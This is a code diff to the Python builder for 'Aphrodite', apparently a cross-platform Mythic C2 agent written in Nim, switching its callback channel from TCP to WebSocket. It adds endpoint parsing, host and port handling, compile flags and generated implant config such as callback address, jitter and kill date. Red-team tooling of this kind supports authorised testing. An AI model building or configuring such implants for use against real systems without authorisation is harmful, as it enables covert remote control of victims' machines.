@@ -23,10 +23,11 @@ class AphroditePayloadType(PayloadType):
 Aphrodite - Agent Mythic C2 cross-platform ecrit en Nim.
 Goddess of beauty. Compiles to native binary from Linux.
 Supports Linux (native) and Windows (cross-compiled via mingw-w64).
-NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
+Profiles: http, websocket.
+NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
 """
     supports_dynamic_loading = False
-    c2_profiles = ["http", "tcp"]
+    c2_profiles = ["http", "websocket"]
     build_parameters = [
         BuildParameter(
             name="target_os",
@@ -86,8 +87,8 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
             c2 = self.c2info[0]
             profile = c2.get_c2profile()
             profile_name = profile.get("name", "")
-            if profile_name not in ("http", "tcp"):
-                build_stderr += f"Aphrodite supports http and tcp C2 profiles. Got: {profile_name}\n"
+            if profile_name not in ("http", "websocket"):
+                build_stderr += f"Aphrodite supports http and websocket C2 profiles. Got: {profile_name}\n"
                 return BuildResponse(
                     status=BuildStatus.Error,
                     build_stdout=build_stdout,
@@ -110,6 +111,11 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
             post_uri = str(_extract(params, "post_uri", "/") or "/")
             if not post_uri.startswith("/"):
                 post_uri = "/" + post_uri
+
+            # WebSocket endpoint path (Mythic websocket profile uses "ENDPOINT_REPLACE" as key)
+            ws_endpoint = str(_extract(params, "ENDPOINT_REPLACE", "") or "")
+            if not ws_endpoint:
+                ws_endpoint = "ws"
 
             try:
                 interval = int(_extract(params, "callback_interval", 10))
@@ -184,11 +190,11 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
             else:
                 base_url = f"{callback_host.rstrip('/')}:{callback_port}"
 
-            # --- TCP host (stripped of scheme/path/port) ---
+            # --- WS host (stripped of scheme/path/port) ---
             import re
-            tcp_host = re.sub(r'^https?://', '', callback_host)
-            tcp_host = tcp_host.split('/')[0].split(':')[0]
-            tcp_port = callback_port
+            ws_host = re.sub(r'^https?://|^wss?://', '', callback_host)
+            ws_host = ws_host.split('/')[0].split(':')[0]
+            ws_port = callback_port
 
             # --- Build parameters ---
             target_os = self.get_parameter("target_os") or "linux"
@@ -197,8 +203,8 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
 
             build_stdout += f"[+] Step 1: Gathering files...\n"
             build_stdout += f"[*] Target: {target_os}/{architecture} | debug={debug}\n"
-            if profile_name == "tcp":
-                build_stdout += f"[*] C2 (TCP): {tcp_host}:{tcp_port} | interval={interval}s jitter={jitter}%\n"
+            if profile_name == "websocket":
+                build_stdout += f"[*] C2 (WS): ws://{ws_host}:{ws_port}/{ws_endpoint} | interval={interval}s jitter={jitter}%\n"
             else:
                 build_stdout += f"[*] C2 (HTTP): {base_url}{post_uri} | interval={interval}s jitter={jitter}%\n"
 
@@ -214,8 +220,9 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
                     uuid=self.uuid,
                     base_url=base_url,
                     post_uri=post_uri,
-                    tcp_host=tcp_host,
-                    tcp_port=tcp_port,
+                    ws_host=ws_host,
+                    ws_port=ws_port,
+                    ws_path=ws_endpoint,
                     interval=interval,
                     jitter=jitter,
                     killdate=killdate,
@@ -270,9 +277,9 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
                     nim_flags.append("-d:release")
                     nim_flags.append("-d:strip")
 
-                # TCP C2 profile
-                if profile_name == "tcp":
-                    nim_flags.append("-d:c2ProfileTcp")
+                # C2 profile selection
+                if profile_name == "websocket":
+                    nim_flags.append("-d:c2ProfileWs")
 
                 # EKE (Linux only — Windows cross-compile lacks OpenSSL)
                 if use_eke:
@@ -368,7 +375,8 @@ NOTE: Requires PSK mode - uncheck 'Encrypted Key Exchange' in HTTP profile.
             )
 
     def _generate_config_nim(
-        self, uuid, base_url, post_uri, tcp_host, tcp_port,
+        self, uuid, base_url, post_uri,
+        ws_host, ws_port, ws_path,
         interval, jitter, killdate, user_agent, aes_psk, use_psk, debug
     ) -> str:
         # Escape backslashes and quotes for Nim string literals
@@ -380,8 +388,9 @@ const
   AgentUUID* = "{nim_str(uuid)}"
   C2BaseUrl* = "{nim_str(base_url)}"
   C2Endpoint* = "{nim_str(post_uri)}"
-  TcpHost* = "{nim_str(tcp_host)}"
-  TcpPort* = {tcp_port}
+  WsHost* = "{nim_str(ws_host)}"
+  WsPort* = {ws_port}
+  WsPath* = "{nim_str(ws_path)}"
   SleepInterval* = {interval}
   JitterPercent* = {jitter}
   KillDate* = "{nim_str(killdate)}"
